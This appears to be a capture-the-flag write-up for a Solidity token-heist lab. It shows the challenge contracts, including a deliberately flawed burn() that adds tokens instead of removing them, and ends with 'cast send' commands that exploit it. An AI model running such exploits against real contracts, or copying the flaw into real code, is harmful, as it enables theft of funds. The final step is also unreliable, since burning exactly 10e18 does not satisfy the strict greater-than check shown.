This Heist require you to get at least 10 Ether from the NewBank that they create in the mist of Inju Bank fall. &nbsp;  
&nbsp;  
```solidity
pragma solidity ^0.8.26;

import "./NewBank.sol";

contract Setup{
    NewBank public NB;
    address public player;

    constructor(uint256 _initialSupply) {
        NB = new NewBank(_initialSupply);
    }

    function setPlayer() public{
        require(msg.sender == tx.origin, "Only Human are allowed to be Player");
        player = msg.sender;
    }

    function isSolved() public view returns(bool){
        return NB.balanceOf(player) > 10 ether;
    }
}
```
&nbsp;  
In the *Setup Contract*, we can know that the *isSolved()* function require us to first *setPlayer()* and it can only be an EOA, meaning we can't use any Exploit Contract here. Now let's see other files that also given to us, *BetterERC20.sol* and *NewBank.sol*, we are going to see the *BetterERC20.sol* first &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IBetterERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);

    function approve(address _spender, uint256 _value) external returns (bool);

    function mint(uint256 _value) external;

    function burn(address _who, uint256 _value) external;

    function owner() external view returns (address);

    function balanceOf(address _who) external view returns (uint256);

    function allowance(
        address _owner,
        address _spender
    ) external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
```
&nbsp;  
Turns out it's not a contract, but an Interface and to be prcise, it's ERC20 Interface. Knowing that we are working with an ERC Standard, makes the scope of search much easier, what we need to be focused on here is a misimplementation or override of the ERC20 original function. For this, let's see the *NewBank Contract* &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IBetterERC20} from "./BetterERC20.sol";

contract NewBank is IBetterERC20{
    address public override owner;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    string public override name = "NewBank Token";
    string public override symbol = "NBT";
    uint8 public override decimals = 18;

    constructor(uint256 _initialSupply) {
        owner = msg.sender;
        balanceOf[msg.sender] = _initialSupply;
    }

    function transfer(address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function approve(address _spender, uint256 _value) external override returns (bool) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function mint(uint256 _value) external override {
        require(msg.sender == owner, "Only Owner are allowed to mint!");
        balanceOf[msg.sender] += _value;
    }

    function burn(address _who, uint256 _value) external override {
        require(balanceOf[_who] <= _value, "Insufficient balance to burn");
        balanceOf[_who] += _value;
    }
    
}
```
&nbsp;  
After viewing all the function here, it seems almost everything is okay except the *burn()* function. *burn()* usually remove a token from the supply and deduct the balance, but this time it's adding it instead of deducting it, so this is the flaw. &nbsp;  
&nbsp;  
We already found the way to get ourselves some balance, by calling the *burn()* with the value of address pointing to our wallet with the value of 10 Ether, so let's just do that! &nbsp;  
&nbsp;  
```bash
// Getting the NewBank Address
cast call -r $RPC_URL $SETUP_ADDR "NB()"

// Get Ourselves 10 Ether
cast send -r $RPC_URL --private-key $PK $NB_ADDR "burn(address,uint256)" $WALLET_ADDR 10000000000000000000
```
&nbsp;  
By running the commands above in your terminal, you should've solve the lab!
